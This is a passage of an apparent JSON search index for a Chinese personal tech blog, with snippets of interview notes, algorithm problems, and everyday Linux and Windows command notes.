tcc","lvl0":"工作6年的面试视频","lvl1":["八股文"],"lvl2":"摘要","objectID":"cda40ec58d5ede440347aec6d44ee516","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E8%A7%86%E9%A2%91%E8%B5%84%E6%96%99%E5%AE%9E%E6%88%98/%E5%B7%A5%E4%BD%9C6%E5%B9%B4%E9%9D%A2%E8%AF%95%E8%A7%86%E9%A2%91/"},{"content":"类型 grep的操作 findstr 查看端口进程 1 2 3 netstat -ano | findstr \u0026#34;8080\u0026#34; taskkill /f /pid powershell 的 echo 1 2 PS D:\\ASUS\\Desktop\u0026gt; echo $(( 16 * 7 )) 112 下面 记录linux 下 echo的用法 result = $[ node1 + node2 ] result=$((node1 + node2)) result=expr 7","lvl0":"常用的 bat脚本","lvl1":null,"lvl2":"摘要","objectID":"6ea1ee13400a4535a4c113b123fbaa54","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/windows10%E5%AD%A6%E4%B9%A0/bat%E8%84%9A%E6%9C%AC/%E5%B8%B8%E7%94%A8%E7%9A%84bat%E8%84%9A%E6%9C%AC/"},{"content":"常用的解压命令 解压 tar.gz文件 具体可以用 --help 来查看 选项的意思 .tar.gz 意思是 先用tar 压缩，再用gz 进行二次压缩 所以 先用 -z 对 进行解压， 然后再用 xf 对","lvl0":"常用的解压命令","lvl1":null,"lvl2":"摘要","objectID":"cd19d949799105801a227ea2f5bf0889","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/%E5%B8%B8%E7%94%A8%E7%9A%84%E8%A7%A3%E5%8E%8B%E5%91%BD%E4%BB%A4/"},{"content":"常见协议刷题 ICMP 协议 ICMP有两种报文：差错报文、询问报文 ICMP差错报文用于目标主机或到目标主机路径上的路由器向源主机报告差错和异常情况。 五","lvl0":"常见协议刷题","lvl1":null,"lvl2":"摘要","objectID":"cfea5c698e2e8e6eec745ee991a1e0f1","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE%E5%88%B7%E9%A2%98/"},{"content":"cms 收集器 CMS（Concurrent Mark Sweep）收集器是一种以获取最短回收停顿时间为目标的收集器，基于并发“标记清理”实现,在标记清理过程","lvl0":"并发垃圾回收","lvl1":null,"lvl2":"摘要","objectID":"5d41b8f2c66a59f35ad335f83f7efc1b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E5%B9%B6%E5%8F%91%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/"},{"content":"相关概念 死锁 活锁 那是不是所有的代码都需要认真分析一遍是否存在这三个问题呢？当然不是，其实只有一种情况需要：存在共享数据并且该数据会发生变化，","lvl0":"并发相关理论","lvl1":null,"lvl2":"摘要","objectID":"1d69c82ed4ba2fa3f5d8a9730b98250b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E5%B9%B6%E5%8F%91%E7%9A%84%E7%9B%B8%E5%85%B3%E7%90%86%E8%AE%BA/"},{"content":"乐观锁 需要对表的设计增加额外的字段，增加了数据库的冗余，另外，当应用并发量高的时候，version值在频繁变化，则会导致大量请求失败，影响系","lvl0":"并发，锁","lvl1":null,"lvl2":"摘要","objectID":"0fbb250257c0ba9ee30e847df9c0ecfe","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/%E5%B9%B6%E5%8F%91_%E9%94%81/"},{"content":"序列化二叉树 请实现两个函数，分别用来序列化和反序列化二叉树。 您需要确保二叉树可以序列化为字符串，并且可以将此字符串反序列化为原始树结构。 样例","lvl0":"序列化二叉树","lvl1":null,"lvl2":"摘要","objectID":"78079ffc87a658a45cb51f5900b1ffa2","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%8C%E5%8F%89%E6%A0%91/"},{"content":"SOA 架构 SOA是什么？SOA全英文是Service-Oriented Architecture，中文意思是中文面向服务编程，是一种思想，一种方法","lvl0":"微服务架构","lvl1":null,"lvl2":"摘要","objectID":"116afb36de19f11e63bdbfffc228caaf","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84/"},{"content":"开启新终端 ctrl + shift + t","lvl0":"快捷键记录","lvl1":null,"lvl2":"摘要","objectID":"8dbf94a46e0355dda8bcfcfc46f0fb5c","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/%E5%BF%AB%E6%8D%B7%E9%94%AE%E8%AE%B0%E5%BD%95/"},{"content":"如何判断公司是否有坑 判断是否有坑 判断投资方面 关注我的直接上级，直接主管【他能决定我获得的能力和成长】 查询企业信用 天眼查 企查查 互联网 4.如果我","lvl0":"怎么判断公司","lvl1":null,"lvl2":"摘要","objectID":"cac4b6a9ab8d5d2acc5f6cc7e8e07cd6","tags":["怎么选择offer","笔试总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%AD%E5%85%AC%E5%8F%B8/"},{"content":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 .: 选择题也经常考，之前转转笔试就考了 .: 8:1:1 江: 这个我知道 江: 他问我你们项目是怎么调整的 江: 新生：老年","lvl0":"怼项目","lvl1":["八股文"],"lvl2":"摘要","objectID":"ecfb209a24f8a94043209a69a2d7263f","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E5%85%AB%E8%82%A1%E6%B7%B1%E6%8C%96/%E6%80%BC%E9%A1%B9%E7%9B%AE/"},{"content":"找出数组中重复的数字 给定一个长度为 nn 的整数数组 nums，数组中所有的数字都在 $0∼n−1$ 的范围内。 数组中某些数字是重复的，但不知道有几个数","lvl0":"找出数组中重复的数字","lvl1":null,"lvl2":"摘要","objectID":"585d63c73e16f12bdcf81498eb9e8885","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%81%8D%E5%8E%86/%E6%89%BE%E5%87%BA%E6%95%B0%E7%BB%84%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0%E5%AD%97/"},{"content":"输入一个正整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。 例如输入数组 [3,32,321][3,32,32","lvl0":"把数组排成最小的数","lvl1":null,"lvl2":"摘要","objectID":"0a8483d997419bbd99f24427309cf4f4","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E8%B4%AA%E5%BF%83/%E6%8A%8A%E6%95%B0%E7%BB%84%E6%8E%92%E6%88%90%E6%9C%80%E5%B0%8F%E7%9A%84%E6%95%B0/"},{"content":"作者：牛客636793145号 链接：https://www.nowcoder.com/discuss/650653 来源：牛客网 接口和抽象类的","lvl0":"抽象类和接口区别","lvl1":null,"lvl2":"摘要","objectID":"3620526eab59c54c1caf03dbcc13f63c","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3%E5%8C%BA%E5%88%AB/"},{"content":"进程的几种状态 就绪： 当进程已分配到除CPU以外的所有必要的资源，只要获得处理机便可立即执行，这时的进程状态称为就绪状态。 执行： 当进程已获得处","lvl0":"操作系统八股文","lvl1":null,"lvl2":"摘要","objectID":"5e22f5338929ff329f2f927a94703d78","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%85%AB%E8%82%A1%E6%96%87/"},{"content":"","lvl0":"操作系统常见的题","lvl1":null,"lvl2":"摘要","objectID":"875cb2b7f7a6c4ccfd8d5bdb7c71b136","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9C%BA%E6%99%AF%E9%A2%98/"},{"content":"实现函数double Power(double base, int exponent)，求base的 exponent次方。 不得使用库函数，同时不需要考虑大数问题。 只要输出结果与答案的","lvl0":"数值的整数次方","lvl1":null,"lvl2":"摘要","objectID":"1f232496c148a3bbff1369ec7b5c5ec0","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%95%B0%E5%AD%A6%E9%97%AE%E9%A2%98/%E6%95%B0%E5%80%BC%E7%9A%84%E6%95%B4%E6%95%B0%E6%AC%A1%E6%96%B9/"},{"content":"数字的排列问题 输入一组数字（可能包含重复数字），输出其所有的排列方式。 样例 1 2 3 4 5 6 7 8 9 10 11 输入：[1,2,3] 输出： [ [1,2,3], [1,3,2], [2,1,3], [2,3,1], [3,1,2], [3,2,1] ] 去","lvl0":"数字的排列","lvl1":null,"lvl2":"摘要","objectID":"73ef78cc8d40d3ca438ca99009d9be5f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%90%9C%E7%B4%A2/%E6%95%B0%E5%AD%97%E7%9A%84%E6%8E%92%E5%88%97%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0/"},{"content":"给定一个数字，我们按照如下规则把它翻译为字符串： 0 翻译成 a，1 翻译成 b，……， 11 翻译成 l，……，25 翻译成 z。 一个数字可能有多个翻译。 例如 12258","lvl0":"数字翻译为字符串","lvl1":null,"lvl2":"摘要","objectID":"81aedce6786ad160dc2dbe64266a9000","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/dp%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%95%B0%E5%AD%97%E7%BF%BB%E8%AF%91%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"content":"数据包记录 ，必刷 IP 数据包最大长度为 65535B(64K字节) 牛客题目链接","lvl0":"数据包常量刷题","lvl1":null,"lvl2":"摘要","objectID":"a1a86b6ad1a5c6e6836eb342adae3162","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%95%B0%E6%8D%AE%E5%8C%85%E5%B8%B8%E9%87%8F%E5%88%B7%E9%A2%98/"},{"content":"数据流的中位数 如何得到一个数据流中的中位数？ 如果从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值。 如果从数据流中读出偶","lvl0":"数据流的中位数","lvl1":null,"lvl2":"摘要","objectID":"517192c65c81d4a00d0657453557e363","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E5%AE%B9%E5%99%A8/%E6%95%B0%E6%8D%AE%E6%B5%81%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0/"},{"content":"数组中有一个数字出现的次数超过数组长度的一半，请找出这个数字。 假设数组非空，并且一定存在满足条件的数字。 思考题： 假设要求只能使用 $ O(n) $的时间","lvl0":"数组中出现次数超过一半的数字","lvl1":null,"lvl2":"摘要","objectID":"d1e101708c7e94a3189455c16e2937ca","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%88%86or%E6%9F%A5%E6%89%BE/%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E8%B6%85%E8%BF%87%E4%B8%80%E5%8D%8A%E7%9A%84%E6%95%B0%E5%AD%97/"},{"content":"文件压缩原理 学习视频 用 数字记录反复出现的 编码 可以用哈夫曼树建立一个编码字典 【频率越高编码越短】 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23","lvl0":"文件压缩原理","lvl1":["八股文"],"lvl2":"摘要","objectID":"55e9ba97950d7f648e38041a9f7a1b6a","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E9%80%9F%E6%88%90%E8%AF%BE/%E6%96%87%E4%BB%B6%E5%8E%8B%E7%BC%A9%E5%8E%9F%E7%90%86/"},{"content":"文件查找 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 find ./ -name \u0026#34;dir0\u0026#34; find ./ -name “*.txt” | xargs rm (删除当前目录下所有以txt结尾的文件) find /home -size +512k 查大于512k的","lvl0":"文件原理","lvl1":null,"lvl2":"摘要","objectID":"d4a45073bbdb3991037452a162e51268","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E6%9F%A5%E6%89%BE/"},{"content":"文件权限 UGO ，acl 权限对象 属主： u 属组： g 其他人： o 权限类型 读 r 4 写 w 2 执行 x 1 chown 可以修改文件所有者 chgrp 可以改变属组 1 2 3 4 5 6 7 8 9 10 11 12 13","lvl0":"文件权限UGO,ACL","lvl1":null,"lvl2":"摘要","objectID":"c791c26483da42a5eb56aa81b851f372","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90-ugoacl/"},{"content":"把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。 输入一个升序的数组的一个旋转，输出旋转数组的最小元素。 例如数组 { $3,4,5,1,2$} 为{ $1,2,3,4,5$ }","lvl0":"旋转数组的最小数字","lvl1":null,"lvl2":"摘要","objectID":"46f1a939dea7f6113b2618c5dae8d35b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%88%86or%E6%9F%A5%E6%89%BE/%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%B0%8F%E6%95%B0%E5%AD%97/"},{"content":"打家劫舍问题 213. 打家劫舍 II Difficulty: 中等 你是一个专业的小偷，计划偷窃沿街的房屋，每间房内都藏有一定的现金。这个地方所有的房屋都 围成一圈 ，这意味着第一个","lvl0":"明源云笔试总结","lvl1":null,"lvl2":"摘要","objectID":"40471ef8d6e3bf366f83368320dc43c0","tags":["选择题刷题笔记","笔试总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E6%98%8E%E6%BA%90%E7%AC%94%E8%AF%95%E6%80%BB%E7%BB%93/"},{"content":"最小的 k个数 输入 n 个整数，找出其中最小的 k 个数。 注意： 输出数组内元素请按从小到大顺序排序; 数据范围 $1≤k≤n≤1000$ 样例 1 2 3 输入：[","lvl0":"最小的k个数","lvl1":null,"lvl2":"摘要","objectID":"42a19107c11cac3c83750b3ae6a8781a","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E5%AE%B9%E5%99%A8/%E6%9C%80%E5%B0%8F%E7%9A%84k%E4%B8%AA%E6%95%B0/"},{"content":"给出一个二叉树，输入两个树节点，求它们的最低公共祖先。 一个树节点的祖先节点包括它本身。 注意： 输入的二叉树不为空； 输入的两个节点一定不为空，且","lvl0":"最近公共祖先","lvl1":null,"lvl2":"摘要","objectID":"c387f8dd249e8302e4574bb9a6d06c54","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/"},{"content":"1.概述 在本篇文章中，你将掌握最常用的 JVM 参数配置。如果对于下面提到了一些概念比如堆、 2.堆内存相关 Java 虚拟机所管理的内存中最大的一块，Java","lvl0":"最重要的JVM参数指南","lvl1":null,"lvl2":"摘要","objectID":"2328c5b69b6da3b74caead57a930d88e","tags":["JVM"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/jvm%E7%90%86%E8%AE%BA/jvm%E8%AF%A6%E7%BB%86%E5%8E%9F%E7%90%86%E6%9D%A5%E8%87%AA%E7%BD%91%E5%8F%8B%E6%95%B4%E7%90%86/%E6%9C%80%E9%87%8D%E8%A6%81%E7%9A%84jvm%E5%8F%82%E6%95%B0%E6%8C%87%E5%8D%97/"},{"content":"服务端开发流程 创建 socket，返回 文件描述符 lfd \u0026ndash;socket() 将 lfd 和 ip port 绑定 \u0026ndash;bind() 将 lfd 由主动监听边被动监听 接受一个新的连接，得到一个 文件描述符 cfd \u0026ndash;accept() 这个是通信","lvl0":"服务端开发流程【网络基础】","lvl1":null,"lvl2":"摘要","objectID":"3806e6dc4ffc394c7ec59fce0116dc6b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/"},{"content":"地上有一个 $m $行和 $n$ 列的方格，横纵坐标范围分别是$ 0∼m−1$ 和 $0∼n−1$ 。 一个机器人从坐标 $(0,0)$的格子开始移动，每一次只能向左","lvl0":"机器人的运动范围","lvl1":null,"lvl2":"摘要","objectID":"da1babb1bd9379a8b2e47260fd922ef1","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%90%9C%E7%B4%A2/%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%9A%84%E8%BF%90%E5%8A%A8%E8%8C%83%E5%9B%B4/"},{"content":"给定一个数组A[0, 1, …, n-1]，请构建一个数组B[0, 1, …, n-1]，其中B中的元素B[i]=A[0]×A[1]×… ×A[i-1]×A[","lvl0":"构建乘积数组","lvl1":null,"lvl2":"摘要","objectID":"cccd10c2414a6ba7bb19eadbd0112c1f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%95%B0%E7%BB%84or%E5%89%8D%E7%BC%80%E5%92%8C/%E6%9E%84%E5%BB%BA%E4%B9%98%E7%A7%AF%E6%95%B0%E7%BB%84/"},{"content":"linux 查漏补缺快捷键总结 ctrl + u, 清空这一行 ctrl + insert 相当于 复制 shift + insert 相当于 黏贴","lvl0":"查漏补缺快捷键总结","lvl1":null,"lvl2":"摘要","objectID":"4f07dd4dcc6f7547017a4045405b36f4","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%80%BB%E7%BB%93/"},{"content":"查看文件more 和 less 命令1： more 作用： 以分页形式显示文件内容 语法: more + 文件名 按回车刷新一行，按空格刷新一屏， 输入 q退出 命令2： less more 不支持后退，","lvl0":"查看文件 more 和 less","lvl1":null,"lvl2":"摘要","objectID":"934b136cea0e1fe275a2eb29efe961eb","tags":["shell命令学习"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6_more-%E5%92%8C-less/"},{"content":"栈的压入弹出序列 输入两个整数序列，第一个序列表示栈的压入顺序，请判断第二个序列是否可能为该栈的弹出顺序。 假设压入栈的所有数字均不相等。 例如序","lvl0":"栈的压入弹出序列","lvl1":null,"lvl2":"摘要","objectID":"a52231a2fdfb6df2a4354405c36959cb","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%A0%88/%E6%A0%88%E7%9A%84%E5%8E%8B%E5%85%A5%E5%BC%B9%E5%87%BA%E5%BA%8F%E5%88%97/"},{"content":"输入两棵二叉树 $A，B$，判断 $ B $ 是不是$ A $ 的子结构。 我们规定空树不是任何树的子结构。 样例 树 AA： 1 2 3 4 5 6 7 8 / \\ 8 7 / \\ 9 2 / \\ 4","lvl0":"树的子结构","lvl1":null,"lvl2":"摘要","objectID":"564343ada27f9ef2a5d088153f988b39","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A0%91%E7%9A%84%E5%AD%90%E7%BB%93%E6%9E%84/"},{"content":"请实现一个函数用来匹配包括'.'和'*'的正则表达式。 模式中的字符'.'表示任意一个字符，而'*'表示它前面的字符可以出现任意次（含0次）。","lvl0":"正则表达式匹配","lvl1":null,"lvl2":"摘要","objectID":"0959d394edaadd2560ae56cced4d4b4f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/dp%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D/"},{"content":"学习教程 参考博客 官方帮助文档：https://mermaid-js.github.io/mermaid/#/flowchart 总结 语言要设置","lvl0":"流程图，时序图","lvl1":null,"lvl2":"摘要","objectID":"f9105ec0e4751b56bbe26d10ee24a311","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/markdown%E8%AF%AD%E6%B3%95/%E6%B5%81%E7%A8%8B%E5%9B%BE-%E6%97%B6%E5%BA%8F%E5%9B%BE%E5%86%99%E6%B3%95/"},{"content":"消息传递性保证 **我们可以利用消息队列的有序性来验证是否有消息丢失。**原理非常简单，在 Producer 端，我们给每个发出的消息附加一个连续递增的序号，然","lvl0":"消息队列_业务_不丢消息【可靠性传递】","lvl1":["消息队列"],"lvl2":"摘要","objectID":"a57ee3f1a178c88e1556475eedef4d5b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97_%E4%B8%9A%E5%8A%A1_%E4%B8%8D%E4%B8%A2%E6%B6%88%E6%81%AF%E8%A7%A3%E5%86%B3/"},{"content":"基础回顾 事务的特性 事务的特性: acid, 原子性，一致性，隔离性，持久性 rabbitMQ分布式事务 两阶段提交原理 1、rocketmq实现分布式事务，使","lvl0":"消息队列_业务_分布式事务","lvl1":["消息队列"],"lvl2":"摘要","objectID":"7c26efa4cf13ebaf09679d1f764f67c7","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97_%E4%B8%9A%E5%8A%A1_%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"},{"content":"消息队列的作用 任务异步运行 服务解耦 流量控制 息队列的本质是将同步处理转成异步处理，异步会带来相应的好处，但也有弊端。 .可在模块、服务、接口等不","lvl0":"消息队列基础应用","lvl1":["消息队列"],"lvl2":"摘要","objectID":"bc647c0645986f39267ef3f91a0c635a","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%9F%BA%E7%A1%80/"},{"content":"深信服 [TOC] 深信服笔试 考察golang语法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package main import ( \u0026#34;fmt\u0026#34; ) func Add(list []int, e int) { _ = append(list, e) } func main() { var list []int Add(list, 1) list = append(list,","lvl0":"深信服笔试","lvl1":null,"lvl2":"摘要","objectID":"f27b992119eda616a85df3f3a7a8cc70","tags":["选择题刷题笔记"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E7%AC%94%E8%AF%95/"},{"content":"usermod 命令 1 2 3 4 5 useradd lilei sudo usermod -aG sudo lilei # 给 lilei 添加到 sudo 用户组 su -l lilei 给user 用户分配权限","lvl0":"添加用户权限","lvl1":null,"lvl2":"摘要","objectID":"abc33f405f8881b4f0664f62c7f4c592","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90/"},{"content":"hugo 渲染latex失败 去掉多余的空格，最好一行显示 ， 要换行 需要打上 4个 \\ 